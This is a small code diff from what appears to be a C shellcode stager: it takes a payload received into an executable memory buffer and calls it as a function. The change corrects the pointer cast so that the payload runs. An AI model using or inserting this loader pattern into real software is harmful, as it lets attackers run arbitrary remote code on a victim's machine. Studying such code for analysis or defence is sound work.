@@ -45,7 +45,7 @@ int main() {
   // printf("Executing payload.\n");
   // Execute the received payload. Skip the first four bytes, which holds the size of the payload.
   void (*func) ();
-  func = (void (*) ()) *(u_long*)(rwx + 4);
+  func = (void (*) ()) (u_long*)(rwx + 4);
   (void) (*func) (); 
 }
 
